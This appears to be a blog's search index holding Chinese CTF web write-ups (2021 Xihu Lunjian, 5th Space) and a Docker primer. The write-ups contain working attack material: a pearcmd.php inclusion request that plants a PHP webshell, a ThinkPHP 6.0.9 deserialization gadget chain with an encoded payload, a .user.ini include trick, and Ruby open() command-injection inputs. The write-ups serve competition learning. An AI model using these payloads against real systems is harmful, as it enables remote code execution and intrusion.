<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021西湖论剑初赛 Web</title>
    <url>/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/</url>
    <content><![CDATA[<p><strong>西湖论剑果然很顶啊，跟队友一起，5道 web 解了4道，感觉时间有点不太够，太菜了呜呜呜</strong></p>
<span id="more"></span>

<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>是个信呼的web应用，老洞都打不了，没有给写入的权限，</p>
<p>所以我们需要去找新的利用点</p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120212655218.png" alt="image-20211120212655218.png"></p>
<p>这个地方把他生成的方法类中的displayfile传入到了下面的mpathname中</p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120212824367.png" alt="image-20211120212824367"></p>
<p>于是在这个位置就可能会造成任意文件包含</p>
<p>然后全局搜索一下那个displayfile</p>
<p>发现在webmain/index/indexAction.php中的getshtmlAction方法里传入一个surl，然后经过拼接传入到了displayfile中，而surl是我们可控的，所以这里确实存在一个文件包含</p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120213157183.png" alt="image-20211120213157183"></p>
<p>这里因为拼接了后缀为php，而我们没有上传文件的权限，所以只能包含已经有的文件。然后就想到前阵子p神提出的pearcmd.php的利用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?+config-create+/&amp;m=index&amp;a=getshtml&amp;surl=Li4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA==&amp;/&lt;?=system($_POST[0])?&gt;+/tmp/a.php</span><br></pre></td></tr></table></figure>

<p>然后再去包含生成的a.php就可以rce</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?m=index&amp;a=getshtml&amp;surl=Li4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">0=system(&#x27;/readflag&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>给了源码，过滤的比较死，平常的绕过都不行，然后发现使用了latte这个模板，去拉了一个下来，发现他会在tempdir目录下生成一个php文件，文件名是又版本号去控制的然后本地起了后改版本号去试靶机上的php文件名，发现是用的2.10.4</p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120214405137.png" alt="image-20211120214405137"></p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120214516000.png" alt="image-20211120214516000"></p>
<p><img src="/2021/11/30/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/image-20211120214754551.png" alt="image-20211120214754551"></p>
<p>那么接下来就直接上传.user.ini去包含/flag就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=&quot;/flag&quot;</span><br></pre></td></tr></table></figure>



<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>这就是个信息泄露，直接扫目录，可以发现有/.idea/dataSources.xml里面直接有flag</p>
<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>这是个tp6.0.9 先直接去读控制器的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/public/?file=Index.php</span><br></pre></td></tr></table></figure>

<p>然后发现有个反序列化点，先要绕一下前面的parse_url</p>
<p>用///可以使parse_url返回false</p>
<p>这样就绕过了正则，然后随便找条链子直接打</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span> = [7];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">view</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Php</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = <span class="keyword">new</span> route\Url(<span class="keyword">new</span> Middleware,<span class="keyword">new</span> Validate,<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Middleware</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$request</span> = <span class="number">2333</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Validate</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$type</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;type = [</span><br><span class="line">                <span class="string">&quot;getDomainBind&quot;</span> =&gt; [<span class="keyword">new</span> view\driver\Php,<span class="string">&#x27;display&#x27;</span>]</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">route</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Url</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">url</span> = &#x27;<span class="title">a</span>:&#x27;;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$domain</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$route</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$app</span>,<span class="variable">$route</span>,<span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;domain = <span class="variable">$cmd</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="variable">$route</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">Model</span>\<span class="title">Pivot</span>(&#x27;&lt;?<span class="title">php</span> <span class="title">system</span>(&quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;); <span class="keyword">exit</span>(); <span class="meta">?&gt;</span><span class="string">&#x27;)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://e20e2f9f-b46f-4eed-9e99-7fc4519907bd.easytp-ctf.dasctf.com:2333///public/index.php/index/unser?vulvul=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A15%3A%22think%5Croute%5CUrl%22%3A4%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A2%3A%22a%3A%22%3Bs%3A9%3A%22%00%2A%00domain%22%3Bs%3A37%3A%22%3C%3Fphp+system%28%22cat+%2Fflag%22%29%3B+exit%28%29%3B+%3F%3E%22%3Bs%3A6%3A%22%00%2A%00app%22%3BO%3A16%3A%22think%5CMiddleware%22%3A1%3A%7Bs%3A7%3A%22request%22%3Bi%3A2333%3B%7Ds%3A8%3A%22%00%2A%00route%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A13%3A%22getDomainBind%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A7%3B%7D%7D</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>比赛WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>Web</tag>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title>初探Docker小蓝鲸</title>
    <url>/2021/12/06/%E5%88%9D%E6%8E%A2Docker/%E5%88%9D%E6%8E%A2Docker/</url>
    <content><![CDATA[<p><strong>之前在参与举办我们学校新生杯的时候，因为需要就系统地学习了一下 Docker 技术，最近做了个小小的总结</strong></p>
<span id="more"></span>

<h3 id="初识-Docker"><a href="#初识-Docker" class="headerlink" title="初识 Docker"></a>初识 Docker</h3><h4 id="Docker-概念"><a href="#Docker-概念" class="headerlink" title="Docker 概念"></a>Docker 概念</h4><ul>
<li>Dokcer 是一个开源的应用容器引擎</li>
<li>基于 Go 语言实现</li>
<li>容器完全使用沙箱机制，相互隔离</li>
<li>容器性能开销极低</li>
</ul>
<h4 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h4><ul>
<li><p>脚本安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Docker-架构"><a href="#Docker-架构" class="headerlink" title="Docker 架构"></a>Docker 架构</h4><ul>
<li>镜像（image）：相当于是一个 root 文件系统</li>
<li>容器（container）：镜像和容器的关系，就像是面向对象程序设计中的类和对象一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等</li>
<li>仓库（repository）：仓库看作是一个代码控制中心，用来保存镜像</li>
</ul>
<h4 id="Docker-配置加速器"><a href="#Docker-配置加速器" class="headerlink" title="Docker 配置加速器"></a>Docker 配置加速器</h4><ul>
<li><p>配置阿里云</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">打开配置文件</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">添加配置</span></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">执行命令生效</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Docker-命令"><a href="#Docker-命令" class="headerlink" title="Docker 命令"></a>Docker 命令</h3><h4 id="进程相关命令"><a href="#进程相关命令" class="headerlink" title="进程相关命令"></a>进程相关命令</h4><ul>
<li><p>启动 docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure></li>
<li><p>停止 docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl stop docke</span><br></pre></td></tr></table></figure></li>
<li><p>重启 docker</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li>
<li><p>查看 docker 服务状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure></li>
<li><p>设置开机启动 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h4><ul>
<li><p>查看镜像：查看本地所有镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker images -q #查看所用镜像 id</span><br></pre></td></tr></table></figure></li>
<li><p>搜索镜像：从网络中查看需要的镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search 镜像名称</span><br></pre></td></tr></table></figure></li>
<li><p>拉取镜像：l从Docker仓库下载镜像到本地，镜像名称格式为 名称:版本号，如果版本号不指定则是最新的版本。如果不知道镜像版本，可以去docker hub 搜索对应镜像查看</p>
</li>
<li><p>```shell<br>docker pull 镜像名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 删除镜像</span><br><span class="line"></span><br><span class="line">  ```shell</span><br><span class="line">  docker rmi 镜像id #删除本地镜像</span><br><span class="line">  docker rmi `docker images -q` #删除本地所有镜像</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="容器相关命令"><a href="#容器相关命令" class="headerlink" title="容器相关命令"></a>容器相关命令</h4><ul>
<li><p>查看容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps #查看正在运行的容器</span><br><span class="line">docker ps -a #查看所有容器</span><br></pre></td></tr></table></figure></li>
<li><p>创建容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run 参数</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>-i：保持容器运行，通常与 -t 参数一起使用</code></li>
<li><code>-t：为容器分配一个伪终端</code></li>
<li><code>-d：以守护模式运行容器，创建一个容器在后台运行</code></li>
<li><code>--name：为创建的容器命名</code></li>
</ul>
</li>
<li><p>进入容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec 参数 #退出容器，容器不会关闭</span><br></pre></td></tr></table></figure></li>
<li><p>启动容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器名称</span><br></pre></td></tr></table></figure></li>
<li><p>停止容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker stop 容器名称</span><br></pre></td></tr></table></figure></li>
<li><p>删除容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dokcer rm 容器名称</span><br></pre></td></tr></table></figure></li>
<li><p>查看容器信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dokcer inspect 容器名</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Docker-数据卷"><a href="#Docker-数据卷" class="headerlink" title="Docker 数据卷"></a>Docker 数据卷</h3><h4 id="数据卷概念"><a href="#数据卷概念" class="headerlink" title="数据卷概念"></a>数据卷概念</h4><ul>
<li>数据卷是宿主机中的一个目录或文件</li>
<li>当容器目录和数据卷绑定之后，两者的修改是同步的</li>
<li>一个数据卷可以被多个容器挂载，一个容器也可以挂载多个数据卷</li>
<li>作用<ul>
<li>容器数据持久化</li>
<li>外部机器和容器间接通信</li>
<li>容器之间数据交换</li>
</ul>
</li>
</ul>
<h4 id="数据卷配置"><a href="#数据卷配置" class="headerlink" title="数据卷配置"></a>数据卷配置</h4><ul>
<li><p>创建容器时，设置数据卷</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run ... -v 宿主机目录:容器内目录 ...</span><br></pre></td></tr></table></figure>

<ul>
<li>注意事项：<ol>
<li>目录必须是绝对路径</li>
<li>如果目录不存在，则自动创建</li>
<li>可以挂载多个数据卷</li>
</ol>
</li>
</ul>
</li>
</ul>
<h4 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h4><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><h4 id="镜像制作"><a href="#镜像制作" class="headerlink" title="镜像制作"></a>镜像制作</h4><ul>
<li><p>容器转镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker commit 容器id 镜像名称:版本号</span><br><span class="line">docker save -o 压缩文件名称 镜像名称:版本号</span><br><span class="line">docker load -i 压缩文件名称</span><br></pre></td></tr></table></figure></li>
<li><p>Dockerfile</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">定义父镜像：FROM centos:7</span><br><span class="line">定义作者信息：MAINTAINER  itheima &lt;itheima@itcast.cn&gt;</span><br><span class="line">执行安装vim命令： RUN yum install -y vim</span><br><span class="line">定义默认的工作目录：WORKDIR /usr</span><br><span class="line">定义容器启动执行的命令：CMD /bin/bash</span><br><span class="line">通过dockerfile构建镜像：docker bulid –f dockerfile文件路径 –t 镜像名称:版本</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Develop</tag>
      </tags>
  </entry>
  <entry>
    <title>第三届第五空间初赛 Web</title>
    <url>/2021/09/17/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    <content><![CDATA[<p><strong>第一次和队友一起 ak web，这次题目总体来说不是很难，有不过几个题目确实很考验人</strong></p>
<span id="more"></span>

<h3 id="PNG图片转换器"><a href="#PNG图片转换器" class="headerlink" title="PNG图片转换器"></a>PNG图片转换器</h3><p>源码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; <span class="params">|f|</span></span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>open函数可以命令执行</p>
<p>exp：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">|<span class="built_in">echo</span> <span class="string">&quot;bHMgLw==&quot;</span> &gt; 5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">|`base64 -d 5aa3c130912c7c2b0268a576ba514ad2.png`&gt;5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">|<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9GTEE5X1B3bW1YNkxEZURuRUxqZzE3R2xS&quot;</span> &gt; 5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">|`base64 -d 5aa3c130912c7c2b0268a576ba514ad2.png`&gt;5aa3c130912c7c2b0268a576ba514ad2.png</span><br><span class="line">5aa3c130912c7c2b0268a576ba514ad2.png</span><br></pre></td></tr></table></figure>

<h3 id="EasyCleanup"><a href="#EasyCleanup" class="headerlink" title="EasyCleanup"></a>EasyCleanup</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | filter(<span class="variable">$shell</span>) | checkNums(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; strlen(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>session文件包含一把梭</p>
